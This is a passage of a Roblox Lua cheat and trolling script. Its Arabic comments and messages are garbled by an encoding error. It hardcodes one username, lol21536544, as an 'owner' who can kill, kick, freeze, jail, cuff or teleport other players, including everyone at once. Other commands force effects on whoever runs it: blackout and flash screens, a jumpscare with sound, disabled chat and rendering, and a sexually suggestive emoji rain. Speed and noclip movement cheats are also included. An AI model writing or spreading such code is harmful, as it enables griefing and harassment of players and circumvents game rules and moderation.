        setupPlayer(player) 
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name:lower() == "lol21536544" and player ~= LocalPlayer then
        task.wait(0.5)
        createOwnerAnimatedTag(player)
    else
        setupPlayer(player)
    end
end)

Players.PlayerRemoving:Connect(removeAdminTag)

-- ===== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ≥ÿ±ÿπÿ© =====
local function applySpeedEffect(speedValue)
    local hum = getHumanoid(LocalPlayer)
    local hrp = getHrp(LocalPlayer)
    if hum and hrp then
        if speedConnections[LocalPlayer] then
            speedConnections[LocalPlayer]:Disconnect()
            speedConnections[LocalPlayer] = nil
        end
        
        speedConnections[LocalPlayer] = RunService.Heartbeat:Connect(function(dt)
            if hum.MoveDirection.Magnitude > 0 and hrp and hrp.Parent then
                local moveDirection = hum.MoveDirection
                hrp.CFrame = hrp.CFrame + (moveDirection * speedValue * dt)
            end
        end)
    end
end

local function resetSpeedEffect()
    if speedConnections[LocalPlayer] then
        speedConnections[LocalPlayer]:Disconnect()
        speedConnections[LocalPlayer] = nil
    end
    
    local hum = getHumanoid(LocalPlayer)
    if hum and originalWalkSpeed then 
        hum.WalkSpeed = originalWalkSpeed 
    end
end

-- ===== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ≥ÿ¨ŸÜ =====
local function makePost(pos)
    local p = Instance.new("Part")
    p.Size = Vector3.new(JAIL_SETTINGS.WALL_THICKNESS, JAIL_SETTINGS.WALL_HEIGHT, JAIL_SETTINGS.WALL_THICKNESS)
    p.Anchored = true
    p.CanCollide = true
    p.Material = Enum.Material.Metal
    p.Color = JAIL_SETTINGS.POSTS_COLOR
    p.Position = pos
    p.Parent = workspace
    return p
end

local function makeRoof(center)
    local roof = Instance.new("Part")
    roof.Size = Vector3.new(JAIL_SETTINGS.WALL_SIZE, JAIL_SETTINGS.WALL_THICKNESS, JAIL_SETTINGS.WALL_SIZE)
    roof.Anchored = true
    roof.CanCollide = true
    roof.Material = Enum.Material.Metal
    roof.Color = JAIL_SETTINGS.POSTS_COLOR
    roof.Position = Vector3.new(center.X, center.Y - JAIL_SETTINGS.FLOOR_OFFSET + JAIL_SETTINGS.WALL_HEIGHT, center.Z)
    roof.Parent = workspace
    return roof
end

local function createJailForPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then 
        return false 
    end
    
    local character = targetPlayer.Character
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then 
        return false 
    end
    
    local jailCenter = humanoidRootPart.Position
    
    if jails[targetPlayer.Name] then 
        removeJail(targetPlayer.Name) 
    end
    
    local posts = {}
    local y = jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + JAIL_SETTINGS.WALL_HEIGHT/2
    local half = JAIL_SETTINGS.WALL_SIZE/2
    local step = JAIL_SETTINGS.POSTS_SPACING

    for x = -half, half, step do
        table.insert(posts, makePost(Vector3.new(jailCenter.X + x, y, jailCenter.Z + half)))
        table.insert(posts, makePost(Vector3.new(jailCenter.X + x, y, jailCenter.Z - half)))
    end

    for z = -half + step, half - step, step do
        table.insert(posts, makePost(Vector3.new(jailCenter.X + half, y, jailCenter.Z + z)))
        table.insert(posts, makePost(Vector3.new(jailCenter.X - half, y, jailCenter.Z + z)))
    end

    local roof = makeRoof(jailCenter)
    
    jails[targetPlayer.Name] = {
        posts = posts,
        roof = roof,
        center = jailCenter,
        connections = {}
    }
    
    local function enforceJail()
        if not targetPlayer.Character then 
            return 
        end
        local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then 
            return 
        end
        
        local pos = hrp.Position
        local limit = JAIL_SETTINGS.WALL_SIZE/2
        local minY = jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET
        local maxY = minY + JAIL_SETTINGS.WALL_HEIGHT
        
        if pos.X < jailCenter.X - limit or pos.X > jailCenter.X + limit or
           pos.Z < jailCenter.Z - limit or pos.Z > jailCenter.Z + limit or
           pos.Y < minY or pos.Y > maxY then
            hrp.CFrame = CFrame.new(jailCenter.X, minY + 3, jailCenter.Z)
        end
    end
    
    local enforceConnection = RunService.Heartbeat:Connect(enforceJail)
    table.insert(jails[targetPlayer.Name].connections, enforceConnection)
    
    local respawnConnection = targetPlayer.CharacterAdded:Connect(function(newChar)
        task.wait(0.5)
        local newHrp = newChar:WaitForChild("HumanoidRootPart")
        if newHrp then
            newHrp.CFrame = CFrame.new(jailCenter.X, jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + 3, jailCenter.Z)
        end
    end)
    table.insert(jails[targetPlayer.Name].connections, respawnConnection)
    
    humanoidRootPart.CFrame = CFrame.new(jailCenter.X, jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + 3, jailCenter.Z)
    
    return true
end

local function removeJail(playerName)
    if not jails[playerName] then return end
    
    for _, connection in ipairs(jails[playerName].connections) do
        pcall(function() connection:Disconnect() end)
    end
    
    if jails[playerName].roof and jails[playerName].roof.Parent then
        jails[playerName].roof:Destroy()
    end
    
    for _, post in ipairs(jails[playerName].posts) do
        if post and post.Parent then
            post:Destroy()
        end
    end
    
    jails[playerName] = nil
end

-- ===== ŸÜÿ∏ÿßŸÖ Cuffs ÿßŸÑŸÖÿµÿ≠ÿ≠ (ÿßŸÑŸÑÿßÿπÿ® ŸäŸÉŸàŸÜ ÿ£ŸÖÿßŸÖŸÉ) =====
local function applyCuffsAnimation(targetCharacter)
    if not targetCharacter then return {} end
    local humanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
    if not humanoid then return {} end
    
    local effects = {}
    humanoid.WalkSpeed = 8
    
    for _, partName in pairs({"LeftHand", "RightHand", "Left Arm", "Right Arm"}) do
        local part = targetCharacter:FindFirstChild(partName)
        if part then
            part.BrickColor = BrickColor.new("Gold")
            part.Material = Enum.Material.Neon
        end
    end
    
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local particleAttachment = Instance.new("Attachment")
        particleAttachment.Parent = humanoidRootPart
        
        local particleEmitter = Instance.new("ParticleEmitter")
        particleEmitter.Parent = particleAttachment
        particleEmitter.Color = ColorSequence.new(Color3.fromRGB(255, 215, 0))
        particleEmitter.Size = NumberSequence.new(0.2)
        particleEmitter.Lifetime = NumberRange.new(0.5, 1)
        particleEmitter.Rate = 15
        particleEmitter.LightEmission = 0.8
        particleEmitter.SpreadAngle = Vector2.new(45, 45)
        
        table.insert(effects, particleAttachment)
        table.insert(effects, particleEmitter)
    end
    
    return effects
end

local function removeCuffsAnimation(targetCharacter, effects)
    if effects then 
        for _, effect in pairs(effects) do 
            if effect and effect.Parent then 
                effect:Destroy() 
            end 
        end 
    end
    if not targetCharacter then return end
    
    local humanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        for _, part in pairs(targetCharacter:GetChildren()) do
            if part:IsA("BasePart") then
                part.BrickColor = BrickColor.new("Medium stone grey")
                part.Material = Enum.Material.Plastic
            end
        end
    end
end

local function createCuffsForPlayer(targetPlayer, adminPlayer)
    if not targetPlayer or not targetPlayer.Character or not adminPlayer or not adminPlayer.Character then 
        return false 
    end
    
    if cuffsConnections[targetPlayer] then 
        cuffsConnections[targetPlayer]:Disconnect() 
        cuffsConnections[targetPlayer] = nil 
    end
    if cuffsEffects[targetPlayer] then 
        removeCuffsAnimation(targetPlayer.Character, cuffsEffects[targetPlayer]) 
        cuffsEffects[targetPlayer] = nil 
    end
    
    local effects = applyCuffsAnimation(targetPlayer.Character)
    cuffsEffects[targetPlayer] = effects
    
    cuffsConnections[targetPlayer] = RunService.RenderStepped:Connect(function()
        if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if cuffsConnections[targetPlayer] then 
                cuffsConnections[targetPlayer]:Disconnect() 
                cuffsConnections[targetPlayer] = nil 
            end
            return
        end
        if not adminPlayer.Character or not adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if cuffsConnections[targetPlayer] then 
                cuffsConnections[targetPlayer]:Disconnect() 
                cuffsConnections[targetPlayer] = nil 
            end
            return
        end
        
        local adminRoot = adminPlayer.Character.HumanoidRootPart
        local targetRoot = targetPlayer.Character.HumanoidRootPart
        
        local offset = adminRoot.CFrame * CFrame.new(0, 0, -4)
        targetRoot.CFrame = CFrame.new(offset.Position, adminRoot.Position)
        targetRoot.Velocity = Vector3.zero
        targetRoot.RotVelocity = Vector3.zero
    end)
    
    return true
end

local function removeCuffsFromPlayer(targetPlayer)
    if cuffsConnections[targetPlayer] then 
        cuffsConnections[targetPlayer]:Disconnect() 
        cuffsConnections[targetPlayer] = nil 
    end
    if cuffsEffects[targetPlayer] and targetPlayer.Character then 
        removeCuffsAnimation(targetPlayer.Character, cuffsEffects[targetPlayer]) 
        cuffsEffects[targetPlayer] = nil 
    end
    return true
end

-- ===== ÿØŸàÿßŸÑ ÿßŸÑÿ™ÿ≠ŸÇŸÇ =====
local function canUseJailCommand(adminName) 
    return adminName:lower() == "lol21536544" 
end

local function canUseCuffsCommand(adminName) 
    return adminName:lower() == "lol21536544" 
end

local function isRestrictedPlace() 
    local placeId = game.PlaceId
    for _, id in ipairs(RESTRICTED_PLACE_IDS) do 
        if placeId == id then 
            return true 
        end 
    end
    return false 
end

-- ===== ÿØŸàÿßŸÑ ÿßŸÑÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ =====
local function setNoRender(enabled)
    if enabled then 
        RunService:Set3dRenderingEnabled(false) 
        persistent.noRender = true
    else 
        RunService:Set3dRenderingEnabled(true) 
        persistent.noRender = false 
    end
end

local function setNoSpeak(enabled)
    if enabled then
        persistent.nospeak = true
        pcall(function() 
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) 
        end)
        
        local chatGui = LocalPlayer.PlayerGui:FindFirstChild("Chat")
        if chatGui then 
            chatGui.Enabled = false 
        end
        
        for _, v in ipairs(messages) do 
            pcall(function() 
                if v and v.Parent then 
                    v:Destroy() 
                end 
            end) 
        end
        messages = {} 
        seenKeys = {} 
        scroll.CanvasSize = UDim2.new(0,0,0,0)
    else
        persistent.nospeak = false
        pcall(function() 
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) 
        end)
        
        local chatGui = LocalPlayer.PlayerGui:FindFirstChild("Chat")
        if chatGui then 
            chatGui.Enabled = true 
        end
    end
end

local function setScream(enabled)
    if enabled then
        if screamFrame then 
            screamFrame:Destroy() 
            screamFrame = nil 
        end
        screamFrame = Instance.new("Frame", screenGui)
        screamFrame.Name = "ScreamEffect"
        screamFrame.Size = UDim2.new(1, 0, 1, 0)
        screamFrame.Position = UDim2.new(0, 0, 0, 0)
        screamFrame.BackgroundColor3 = Color3.new(0, 0, 0)
        screamFrame.BorderSizePixel = 0
        screamFrame.ZIndex = 999999
        
        local screamImage = Instance.new("ImageLabel", screamFrame)
        screamImage.Size = UDim2.new(1, 0, 1, 0)
        screamImage.Position = UDim2.new(0, 0, 0, 0)
        screamImage.BackgroundTransparency = 1
        screamImage.Image = SCREAM_IMAGE_ID
        screamImage.ScaleType = Enum.ScaleType.Stretch
        screamImage.ZIndex = 1000000
        
        pcall(function()
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://6269646683"
            sound.Parent = game:GetService("SoundService")
            sound:Play()
            Debris:AddItem(sound, 10)
        end)
    else
        if screamFrame then 
            screamFrame:Destroy() 
            screamFrame = nil 
        end
    end
end

local function setFun(enabled)
    if enabled then
        if funConn then 
            funConn:Disconnect() 
        end
        pcall(function()
            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then 
                originalWalkSpeed = humanoid.WalkSpeed 
                humanoid.WalkSpeed = 0 
            end
        end)
        funConn = RunService.Heartbeat:Connect(function()
            pcall(function()
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("Humanoid") then
                    local humanoid = character:FindFirstChild("Humanoid")
                    local hrp = character:FindFirstChild("HumanoidRootPart")
                    if humanoid and hrp then
                        local moveDirection = humanoid.MoveDirection
                        if moveDirection.Magnitude > 0.1 then
                            local newPosition = hrp.Position - (moveDirection * 0.5)
                            hrp.CFrame = CFrame.new(newPosition, newPosition + moveDirection)
                        end
                    end
                end
            end)
        end)
    else
        if funConn then
            funConn:Disconnect() 
            funConn = nil
            pcall(function()
                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then 
                    humanoid.WalkSpeed = originalWalkSpeed 
                end
            end)
        end
    end
end

-- ===== ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ŸÖÿ±ÿ© =====
persistent = persistent or {
    vanished = false, noclip = false, nospeak = false, blind = false, lay = false,
    slow = false, milk = false, flash = false, nohair = false,
    dance = false, spin = false, scream = false, fun = false,
    noRender = false, queuedCommands = {}
}
persistent.savedAccessories = persistent.savedAccessories or {}

local blindFrame, flashFrame, milkContainer, milkConn, danceTrack, screamFrame, spinConn

-- ===== ÿØÿßŸÑÿ© ÿ•ÿπÿßÿØÿ© ÿ™ÿ∑ÿ®ŸäŸÇ ÿßŸÑÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ =====
local function ensureCharacterThenRun(fn)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
        fn(LocalPlayer.Character) 
        return 
    end
    local conn
    conn = LocalPlayer.CharacterAdded:Connect(function(char)
        if conn then 
            conn:Disconnect() 
            conn = nil 
        end
        task.wait(0.2)
        fn(char)
    end)
end

local function enqueueCommand(admin, cmd, args) 
    table.insert(persistent.queuedCommands, {admin = admin, cmd = cmd, args = args or {}}) 
end

local function processQueuedCommands()
    if not persistent.queuedCommands or #persistent.queuedCommands == 0 then 
        return 
    end
    local q = persistent.queuedCommands
    persistent.queuedCommands = {}
    for _, item in ipairs(q) do 
        pcall(function() 
            if Commands[item.cmd] then 
                pcall(function() 
                    Commands[item.cmd](item.admin, table.unpack(item.args)) 
                end) 
            end 
        end) 
    end
end

local function reapplyPersistent()
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then 
        screenGui.Parent = pg 
    end
    
    ensureCharacterThenRun(function(char)
        local hum = getHumanoid(LocalPlayer)
        local hrp = getHrp(LocalPlayer)
        
        if persistent.vanished and char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Transparency = 1
                end
            end
        end
        
        if persistent.noclip and char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.CanCollide = false
                end
            end
        end
        
        if persistent.lay and hrp and hum then
            hum.PlatformStand = true
            hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(90),0,0)
        end
        if persistent.slow and hum then
            hum.WalkSpeed = 4
            applySpeedEffect(4)
        else
            if hum and originalWalkSpeed then
                hum.WalkSpeed = originalWalkSpeed
            end
            resetSpeedEffect()
        end
        
        if persistent.dance and hum then
            pcall(function()
                local isR15 = hum.RigType == Enum.HumanoidRigType.R15
                local danceAnimationId = isR15 and "rbxassetid://507771019" or "rbxassetid://507770268"
                if danceTrack and danceTrack.IsPlaying then 
                    danceTrack:Stop() 
                end
                local anim = Instance.new("Animation")
                anim.AnimationId = danceAnimationId
                danceTrack = hum:LoadAnimation(anim)
                danceTrack.Looped = true
                danceTrack:Play()
            end)
        else
            if danceTrack and danceTrack.IsPlaying then 
                pcall(function() 
                    danceTrack:Stop() 
                end) 
                danceTrack = nil 
            end
        end
        
        if persistent.spin and hrp then
            if spinConn then 
                spinConn:Disconnect() 
                spinConn = nil 
            end
            spinConn = RunService.Heartbeat:Connect(function(dt)
                local root = hrp
                if root and root.Parent and persistent.spin then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(3600 * dt), 0)
                else
                    if spinConn then 
                        spinConn:Disconnect() 
                        spinConn = nil 
                    end
                end
            end)
        else
            if spinConn then 
                spinConn:Disconnect() 
                spinConn = nil 
            end
        end
        
        if persistent.nohair and char then
            for _, acc in ipairs(char:GetChildren()) do
                if acc:IsA("Accessory") then
                    local aname = acc.Name
                    if not persistent.savedAccessories[aname] then
                        pcall(function() 
                            persistent.savedAccessories[aname] = acc:Clone() 
                        end)
                    end
                    pcall(function() 
                        acc:Destroy() 
                    end)
                end
            end
            local head = char:FindFirstChild("Head")
            if head then
                for _, c in ipairs(head:GetChildren()) do
                    if c:IsA("SpecialMesh") or tostring(c.Name):lower():find("hair") then
                        pcall(function() 
                            c:Destroy() 
                        end)
                    end
                end
            end
        end
        
        setNoSpeak(persistent.nospeak)
        setScream(persistent.scream)
        setFun(persistent.fun)
        setNoRender(persistent.noRender)
        
        if persistent.blind then
            if not blindFrame or not blindFrame.Parent then
                blindFrame = Instance.new("Frame", screenGui)
                blindFrame.Name = "__blind_full"
                blindFrame.Size = UDim2.new(1,0,1,0)
                blindFrame.Position = UDim2.new(0,0,0,0)
                blindFrame.BackgroundColor3 = Color3.new(0,0,0)
                blindFrame.BorderSizePixel = 0
                blindFrame.ZIndex = 999999
            end
        else
            if blindFrame and blindFrame.Parent then 
                blindFrame:Destroy() 
                blindFrame = nil 
            end
        end
        
        if persistent.flash then
            if not flashFrame or not flashFrame.Parent then
                flashFrame = Instance.new("Frame", screenGui)
                flashFrame.Name = "__flash_full"
                flashFrame.Size = UDim2.new(1,0,1,0)
                flashFrame.Position = UDim2.new(0,0,0,0)
                flashFrame.BackgroundColor3 = Color3.new(1,1,1)
                flashFrame.BorderSizePixel = 0
                flashFrame.ZIndex = 999999
                flashFrame.BackgroundTransparency = 0
            end
        else
            if flashFrame and flashFrame.Parent then 
                flashFrame:Destroy() 
                flashFrame = nil 
            end
        end
        
        if persistent.milk then
            if not milkConn then
                if not milkContainer or not milkContainer.Parent then 
                    milkContainer = Instance.new("Folder", screenGui)
                    milkContainer.Name = "__milk_emojis" 
                end
                milkConn = RunService.Heartbeat:Connect(function(dt)
                    if not persistent.milk then 
                        return 
                    end
                    local spawnCount = math.random(1,3)
                    for i=1, spawnCount do
                        local x = math.random(0,100)/100
                        local lbl = Instance.new("TextLabel")
                        lbl.Size = UDim2.new(0,50,0,50)
                        lbl.Position = UDim2.new(x, -25, -0.15 - math.random()*0.4, 0)
                        lbl.BackgroundTransparency = 1
                        lbl.Text = "üí¶"
                        lbl.TextScaled = true
                        lbl.Font = Enum.Font.SourceSans
                        lbl.TextColor3 = Color3.new(1,1,1)
                        lbl.ZIndex = 999998
                        lbl.Parent = milkContainer

                        local duration = math.random(8,14)/10
                        local endPos = UDim2.new(x, -25, 1.3, 0)
                        local tweenInfo = TweenService:Create(lbl, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Position = endPos})
                        tweenInfo:Play()
                        delay(duration + 0.05, function() 
                            pcall(function() 
                                if lbl and lbl.Parent then 
                                    lbl:Destroy() 
                                end 
                            end) 
                        end)
                    end
                end)
            end
        else
            if milkConn then 
                milkConn:Disconnect() 
                milkConn = nil 
            end
            if milkContainer and milkContainer.Parent then
                for _, c in ipairs(milkContainer:GetChildren()) do 
                    pcall(function() 
                        c:Destroy() 
                    end) 
                end
                milkContainer:Destroy()
                milkContainer = nil
            end
        end
        
        processQueuedCommands()
    end)
end

LocalPlayer.CharacterAdded:Connect(function() 
    task.wait(1.1) 
    reapplyPersistent() 
end)

LocalPlayer.CharacterRemoving:Connect(function(char)
    pcall(function() 
        if danceTrack and danceTrack.IsPlaying then 
            danceTrack:Stop() 
        end 
    end)
    if spinConn then 
        spinConn:Disconnect() 
        spinConn = nil 
    end
    if milkConn then 
        milkConn:Disconnect() 
        milkConn = nil 
    end
    if funConn then 
        funConn:Disconnect() 
        funConn = nil 
    end
end)

-- ===== ÿ™ÿπÿ±ŸäŸÅ ÿßŸÑÿ£ŸàÿßŸÖÿ± =====
local Commands = {}

local function runOrEnqueue(admin, cmdName, args)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        if Commands[cmdName] then 
            pcall(function() 
                Commands[cmdName](admin, table.unpack(args or {})) 
            end) 
        end
    else 
        enqueueCommand(admin, cmdName, args) 
    end
end

-- ===== ÿ£ŸàÿßŸÖÿ± ÿßŸÑÿ≠ÿ±ŸÉÿ© =====
function Commands.bring(admin, target) 
    if not target then return end
    
    if target:lower() == "me" then
        runOrEnqueue(admin, "bring_exec", {admin, target})
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Commands.bring_exec(admin, player.Name)
            end
        end
        addMessage("SYSTEM", "üöÄ " .. admin .. " ÿ¨ŸÑÿ® ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        runOrEnqueue(admin, "bring_exec", {admin, target})
    end
end

function Commands.bring_exec(admin, target)
    local targetPlayer = findPlayerByPartial(target)
    local adminPlayer = Players:FindFirstChild(admin)
    
    if targetPlayer and adminPlayer and targetPlayer.Character and adminPlayer.Character then
        local targetHrp = getHrp(targetPlayer)
        local adminHrp = getHrp(adminPlayer)
        
        if targetHrp and adminHrp then
            targetHrp.CFrame = adminHrp.CFrame
            addMessage("SYSTEM", "üöÄ " .. admin .. " ÿ¨ŸÑÿ® " .. targetPlayer.Name)
        end
    end
end

function Commands.kill(admin, target) 
    if not target then return end
    
    if target:lower() == "me" then
        runOrEnqueue(admin, "kill_exec", {admin, target})
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Commands.kill_exec(admin, player.Name)
            end
        end
        addMessage("SYSTEM", "üíÄ " .. admin .. " ŸÇÿ™ŸÑ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        runOrEnqueue(admin, "kill_exec", {admin, target})
    end
end

function Commands.kill_exec(admin, target)
    local targetPlayer = findPlayerByPartial(target)
    if targetPlayer then
        local hum = getHumanoid(targetPlayer)
        if hum then 
            hum.Health = 0 
            addMessage("SYSTEM", "üíÄ " .. admin .. " ŸÇÿ™ŸÑ " .. targetPlayer.Name)
        end
    end
end

function Commands.freeze(admin, target) 
    if not target then return end
    
    if target:lower() == "me" then
        runOrEnqueue(admin, "freeze_exec", {admin, target})
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Commands.freeze_exec(admin, player.Name)
            end
        end
        addMessage("SYSTEM", "‚ùÑÔ∏è " .. admin .. " ÿ¨ŸÖÿØ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        runOrEnqueue(admin, "freeze_exec", {admin, target})
    end
end

function Commands.freeze_exec(admin, target)
    local targetPlayer = findPlayerByPartial(target)
    if targetPlayer then
        local hum = getHumanoid(targetPlayer)
        if hum then 
            hum.PlatformStand = true 
            addMessage("SYSTEM", "‚ùÑÔ∏è " .. admin .. " ÿ¨ŸÖÿØ " .. targetPlayer.Name)
        end
    end
end

function Commands.unfreeze(admin, target) 
    if not target then return end
    
    if target:lower() == "me" then
        runOrEnqueue(admin, "unfreeze_exec", {admin, target})
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Commands.unfreeze_exec(admin, player.Name)
            end
        end
        addMessage("SYSTEM", "üî• " .. admin .. " ÿ£ÿ∞ÿßÿ® ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        runOrEnqueue(admin, "unfreeze_exec", {admin, target})
    end
end

function Commands.unfreeze_exec(admin, target)
    local targetPlayer = findPlayerByPartial(target)
    if targetPlayer then
        local hum = getHumanoid(targetPlayer)
        if hum then 
            hum.PlatformStand = false 
            addMessage("SYSTEM", "üî• " .. admin .. " ÿ£ÿ∞ÿßÿ® " .. targetPlayer.Name)
        end
    end
end

function Commands.teleportto(admin, target) 
    runOrEnqueue(admin, "teleportto_exec", {admin, target}) 
end

function Commands.teleportto_exec(admin, target)
    local t = findPlayerByPartial(target)
    if t and t.Character and getHrp(t) and getHrp(LocalPlayer) then
        getHrp(LocalPlayer).CFrame = getHrp(t).CFrame
        addMessage("SYSTEM", "üì° " .. admin .. " ÿßŸÜÿ™ŸÇŸÑ ÿ•ŸÑŸâ " .. t.Name)
    end
end

function Commands.speed(admin, target, value) 
    runOrEnqueue(admin, "speed_exec", {admin, target, value}) 
end

function Commands.speed_exec(admin, target, value)
    if target:lower() ~= "me" then return end
    
    local v = tonumber(value) or 16
    applySpeedEffect(v)
    addMessage("SYSTEM", "‚ö° " .. admin .. " ÿ∫Ÿäÿ± ÿßŸÑÿ≥ÿ±ÿπÿ© ÿ•ŸÑŸâ " .. v)
end

function Commands.resetSpeed(admin, target) 
    runOrEnqueue(admin, "resetSpeed_exec", {admin, target}) 
end

function Commands.resetSpeed_exec(admin, target)
    if target:lower() ~= "me" then return end
    
    resetSpeedEffect()
    addMessage("SYSTEM", "üîÑ " .. admin .. " ÿ£ÿπÿßÿØ ÿßŸÑÿ≥ÿ±ÿπÿ© ÿ•ŸÑŸâ ÿßŸÑÿ∑ÿ®ŸäÿπŸä")
end

-- ===== ÿ£ŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ =====
function Commands.vanish(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.vanished = true
    reapplyPersistent()
    addMessage("SYSTEM", "üëª " .. admin .. " ÿßÿÆÿ™ŸÅŸâ")
end

function Commands.unvanish(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.vanished = false
    reapplyPersistent()
    addMessage("SYSTEM", "üë§ " .. admin .. " ÿ∏Ÿáÿ±")
end

function Commands.noclip(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.noclip = not persistent.noclip
    reapplyPersistent()
    addMessage("SYSTEM", "üö´ " .. admin .. (persistent.noclip and " ŸÅÿπŸÑ ÿßŸÑŸÜŸàŸÉŸÑÿ®" or " ÿπÿ∑ŸÑ ÿßŸÑŸÜŸàŸÉŸÑÿ®"))
end

function Commands.yassin(admin, target)
    pcall(function()
        if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
            TextChatService.TextChannels.RBXGeneral:SendAsync("Ÿäÿßÿ≥ŸäŸÜ ÿπŸÖŸä")
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ÿäÿßÿ≥ŸäŸÜ ÿπŸÖŸä","All")
        end
    end)
    addMessage("SYSTEM", "üïå " .. admin .. " ŸÇÿßŸÑ: Ÿäÿßÿ≥ŸäŸÜ ÿπŸÖŸä")
end

function Commands.kick(admin, target, ...)
    if not target then return end
    
    if target:lower() == "me" then
        local reason = "üõë ÿ™ŸÖ ÿ∑ÿ±ÿØŸÉ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© " .. admin
        pcall(function() 
            LocalPlayer:Kick(reason) 
        end)
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    player:Kick("üõë ÿ™ŸÖ ÿ∑ÿ±ÿØŸÉ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© " .. admin)
                end)
            end
        end
        addMessage("SYSTEM", "üë¢ " .. admin .. " ÿ∑ÿ±ÿØ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        local targetPlayer = findPlayerByPartial(target)
        if targetPlayer and targetPlayer ~= LocalPlayer then
            pcall(function()
                targetPlayer:Kick("üõë ÿ™ŸÖ ÿ∑ÿ±ÿØŸÉ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© " .. admin)
            end)
            addMessage("SYSTEM", "üë¢ " .. admin .. " ÿ∑ÿ±ÿØ " .. targetPlayer.Name)
        end
    end
end

function Commands.milk(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.milk = true
    reapplyPersistent()
    addMessage("SYSTEM", "ü•õ " .. admin .. " ŸÅÿπŸÑ ÿßŸÑŸÖŸäŸÄŸÑŸÉ")
end

function Commands.unmilk(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.milk = false
    reapplyPersistent()
    addMessage("SYSTEM", "üö± " .. admin .. " ÿπÿ∑ŸÑ ÿßŸÑŸÖŸäŸÄŸÑŸÉ")
end

function Commands.lay(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.lay = true
    reapplyPersistent()
    addMessage("SYSTEM", "üò¥ " .. admin .. " ŸÜÿßŸÖ")
end

function Commands.unlay(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.lay = false
    reapplyPersistent()
    addMessage("SYSTEM", "üëÅÔ∏è " .. admin .. " ÿµÿ≠Ÿâ")
end

function Commands.dchat(admin, target)
    local t = findPlayerByPartial(target)
    if not t then return end
    
    if t == LocalPlayer then
        persistent.nospeak = true
        reapplyPersistent()
        addMessage("SYSTEM", "üîá " .. admin .. " ÿπÿ∑ŸÑ ÿ¥ÿßÿ™ ŸÜŸÅÿ≥Ÿá")
    else
        blockPlayerChat(t)
        addMessage("SYSTEM", "üîá " .. admin .. " ŸÖŸÜÿπ ÿ¥ÿßÿ™ " .. t.Name)
    end
end

function Commands.rchat(admin, target)
    local t = findPlayerByPartial(target)
    if not t then return end
    
    if t == LocalPlayer then
        persistent.nospeak = false
        reapplyPersistent()
        addMessage("SYSTEM", "üîä " .. admin .. " ŸÅÿ™ÿ≠ ÿ¥ÿßÿ™ ŸÜŸÅÿ≥Ÿá")
    else
        unblockPlayerChat(t)
        addMessage("SYSTEM", "üîä " .. admin .. " ŸÅÿ™ÿ≠ ÿ¥ÿßÿ™ " .. t.Name)
    end
end

function Commands.blind(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.blind = true
    reapplyPersistent()
